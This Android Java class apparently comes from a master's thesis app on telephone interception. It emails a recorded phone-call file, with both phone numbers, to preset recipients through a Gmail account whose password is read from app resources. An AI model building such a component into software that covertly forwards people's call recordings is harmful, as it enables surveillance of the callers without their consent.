package corso.java.tesiintercettazionitelefoniche;

import android.content.Context;
import android.util.Log;

public class MailSender {
    GMailSender sender;
    Context context;
    private String address;
    private String location;
    private String fileName;

    public MailSender(Context context, String address){
        this.context = context;
        this.address = address;
        this.sender = new GMailSender(context.getResources().getString(R.string.user), context.getResources().getString(R.string.password));
    }

    public void setFileName(String location, String fileName){
        this.location = location;
        this.fileName = fileName;
    }

    public void sendMail(String myNumber, String savedPhoneNumber){
        try {
            this.sender.sendMail("Invio intercettazione telefonica " + fileName,
                    "In riferimento alla tesi magistrale sostenuta da Santoro Vincenzo con il Prof. De prisco, si invia ai fini di studio l'intercettazione telefonica tra " + myNumber + " e " + savedPhoneNumber,
                    context.getResources().getString(R.string.user),
                    context.getResources().getString(R.string.recipients),
                    location + fileName);
        }catch(Exception e){
            Log.e("AudioRecordTest", e.getClass().toString());
            if(e.getMessage()!=null)
                Log.e("AudioRecordTest", e.getMessage());
        }

    }
}